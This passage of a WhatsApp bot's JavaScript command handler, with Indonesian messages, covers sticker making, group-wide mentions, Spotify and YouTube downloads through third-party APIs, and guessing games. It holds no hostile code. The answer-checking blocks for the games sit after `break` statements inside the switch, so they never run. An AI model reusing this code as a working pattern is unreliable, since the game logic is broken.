    if (bg == "biru") bgColor = "#22b4f2"
    if (bg == "ungu") bgColor = "#eb13f2"

    // ambil pp user
    let ppuser
    try {
      ppuser = await sock.profilePictureUrl(m.sender, 'image')
    } catch {
      ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
    }

    // API aktif pengganti bot.lyo.su
    const res = await axios.get(
      `https://api.erdwpe.com/api/qc?name=${encodeURIComponent(m.pushName)}&text=${encodeURIComponent(teks)}&avatar=${encodeURIComponent(ppuser)}&bg=${encodeURIComponent(bgColor)}`
    )

    const buffer = await getBuffer(res.data.result)
    await sock.sendAsSticker(m.chat, buffer, m, {
      packname: "XskyBew",
      author: "Quote Maker"
    })

  } catch (e) {
    console.error(e)
    await gagal(m)
  }
}
break


case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await sock.downloadAndSaveMediaMessage(qmsg)
await sock.sendAsSticker(m.chat, image, m, {packname: "XskyBew"})
await fs.unlinkSync(image)
}
break

case "tagall": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await sock.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

case 'play': {
  if (!text) return m.reply(example('judul lagunya'))

  try {
    await loading(m)
    const res = await fetch(`https://api.privatezia.biz.id/api/downloader/playspotify?query=${encodeURIComponent(text)}`)
    const data = await res.json()

    if (!data.status || !data.result?.downloadUrl) 
      return await gagal(m)

    const { title, artist, duration, thumbnail, downloadUrl, spotifyUrl } = data.result

    let caption = `🎵 *${title}*\n👤 ${artist}\n⏱️ Durasi: ${duration}`

    await sock.sendMessage(m.chat, {
      image: { url: thumbnail },
      caption
    }, { quoted: m })

    await sock.sendMessage(m.chat, {
      audio: { url: downloadUrl },
      mimetype: 'audio/mpeg',
      fileName: `${title}.mp3`
    }, { quoted: m })

  } catch (e) {
    console.error(e)
    m.reply('⚠️ Terjadi kesalahan, coba lagi nanti.')
  }
}
break

case 'ytsearch': {
    if (!text) return m.reply('❌ Masukkan kata kunci.\nContoh: *.ytsearch lagu galau*')

    try {
        let search = await yts(text)
        let video = search.videos[0]
        if (!video) return await gagal(m)

        let pesan = `🎬 *${video.title}*\n👤 ${video.author.name}\n⏱️ ${video.timestamp}\n👁️ ${video.views.toLocaleString()} Views\n📅 ${video.ago}\n\n🔗 ${video.url}`

        let stream = ytdl(video.url, {
            filter: 'audioandvideo',
            quality: 'lowest',
            highWaterMark: 1 << 25
        })

        let pathFile = `./yt-${Date.now()}.mp4`
        let write = fs.createWriteStream(pathFile)
        stream.pipe(write)

        write.on('finish', async () => {
            await sock.sendMessage(m.chat, {
                video: fs.readFileSync(pathFile),
                caption: pesan
            }, { quoted: m })
            fs.unlinkSync(pathFile)
        })

    } catch (e) {
        console.error(e)
        m.reply('❌ Terjadi kesalahan saat mengambil video.')
    }
}
break

case 'tebakgambar': {
  try {
    let res = await fetch('https://api.siputzx.my.id/api/games/tebakgambar')
    let json = await res.json()
    let data = json.data

    if (!global.tebakgambar) global.tebakgambar = {}
    
    // kirim soal
    let sent = await sock.sendMessage(m.chat, {
      image: { url: data.img },
      caption: `🎮 *Tebak Gambar!*\n\n${data.deskripsi}\n\n⏱️ Kamu punya *60 detik* untuk menjawab!\n\nBalas gambar ini dengan jawabanmu!`
    }, { quoted: m })
    
    // simpan data game
    global.tebakgambar[sent.key.id] = {
      jawaban: data.jawaban.toLowerCase(),
      timeout: setTimeout(() => {
        if (global.tebakgambar[sent.key.id]) {
          sock.sendMessage(m.chat, {
            text: `⏰ Waktu habis!\nJawaban yang benar adalah: *${data.jawaban}*`
          })
          delete global.tebakgambar[sent.key.id]
        }
      }, 60000) // 60 detik
    }

  } catch (err) {
    console.error(err)
    m.reply('❌ Gagal mengambil soal tebak gambar.')
  }
  break
}

// deteksi jawaban user yang reply ke gambar
if (m.quoted && global.tebakgambar && global.tebakgambar[m.quoted.id]) {
  let game = global.tebakgambar[m.quoted.id]
  let jawabanUser = (m.text || '').trim().toLowerCase()

  if (jawabanUser === game.jawaban) {
    clearTimeout(game.timeout)
    delete global.tebakgambar[m.quoted.id]
    return m.reply('✅ *Benar!* Kamu hebat 🎉')
  } else {
    return m.reply('❌ Salah! Coba lagi sebelum waktunya habis ⏳')
  }
}

case 'family100': {
  try {
    let res = await fetch('https://api.siputzx.my.id/api/games/family100')
    let json = await res.json()
    let data = json.data

    if (!global.family100) global.family100 = {}

    // kirim soal
    let sent = await sock.sendMessage(m.chat, {
      text: `🎯 *Family 100 Game!*\n\n🧩 Pertanyaan: *${data.soal}*\n\nBalas pesan ini dengan jawabanmu!\nKamu punya ⏱️ *60 detik* untuk menjawab.`,
    }, { quoted: m })

    // simpan state game
    global.family100[sent.key.id] = {
      jawaban: data.jawaban.map(v => v.toLowerCase()),
      dijawab: [],
      timeout: setTimeout(() => {
        if (global.family100[sent.key.id]) {
          let belum = global.family100[sent.key.id].jawaban
            .filter(v => !global.family100[sent.key.id].dijawab.includes(v))
          sock.sendMessage(m.chat, {
            text: `⏰ *Waktu habis!*\nBerikut semua jawaban yang benar:\n\n${data.jawaban.map(v => `- ${v}`).join('\n')}`
          })
          delete global.family100[sent.key.id]
        }
      }, 60000)
    }

  } catch (err) {
    console.error(err)
    m.reply('❌ Gagal mengambil data Family 100.')
  }
  break
}

// deteksi jawaban user
if (m.quoted && global.family100 && global.family100[m.quoted.id]) {
  let game = global.family100[m.quoted.id]
  let jawab = (m.text || '').trim().toLowerCase()

  // kalau sudah semua dijawab, abaikan
  if (game.jawaban.length === game.dijawab.length) return

  if (game.jawaban.includes(jawab)) {
    if (game.dijawab.includes(jawab)) {
      return m.reply('⚠️ Jawaban itu sudah disebut!')
    }
    game.dijawab.push(jawab)

    m.reply(`✅ *Benar!* (${game.dijawab.length}/${game.jawaban.length})`)

    // kalau semua jawaban benar
    if (game.dijawab.length === game.jawaban.length) {
      clearTimeout(game.timeout)
      delete global.family100[m.quoted.id]
      m.reply('🎉 *Selamat!* Semua jawaban berhasil ditemukan!')
    }
  } else {
    m.reply('❌ Salah! Coba lagi!')
  }
}

case 'siapakahaku': {
  try {
    let res = await fetch('https://api.siputzx.my.id/api/games/siapakahaku')
    let json = await res.json()
    let data = json.data

    if (!global.siapakahaku) global.siapakahaku = {}

    // kirim soal
    let sent = await sock.sendMessage(m.chat, {
      text: `🧠 *Siapakah Aku?*\n\n${data.soal}\n\n⏱️ Kamu punya *60 detik* untuk menjawab!\nBalas pesan ini dengan jawabanmu.`,
    }, { quoted: m })

    // simpan state
    global.siapakahaku[sent.key.id] = {
      jawaban: data.jawaban.toLowerCase(),
      timeout: setTimeout(() => {
        if (global.siapakahaku[sent.key.id]) {
          sock.sendMessage(m.chat, {
            text: `⏰ *Waktu habis!*\nJawaban yang benar adalah: *${data.jawaban}*`
          })
          delete global.siapakahaku[sent.key.id]
        }
      }, 60000) // 60 detik
    }

  } catch (err) {
    console.error(err)
    m.reply('❌ Gagal mengambil data Siapakah Aku.')
  }
  break
}

// deteksi jawaban user (reply)
if (m.quoted && global.siapakahaku && global.siapakahaku[m.quoted.id]) {
  let game = global.siapakahaku[m.quoted.id]
  let jawab = (m.text || '').trim().toLowerCase()

  if (jawab === game.jawaban) {
    clearTimeout(game.timeout)
    delete global.siapakahaku[m.quoted.id]
    return m.reply('✅ *Benar!* Kamu pintar banget 🔥')
  } else {
    return m.reply('❌ Salah! Coba lagi sebelum waktunya habis ⏳')
  }
}
//~~~~~~~~~~~//

// Helper
function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

default:
if (m.text.toLowerCase() == "bot") {
m.reply("Online Kak ✅")
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
}
} catch (err) {
console.log(util.format(err));
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
});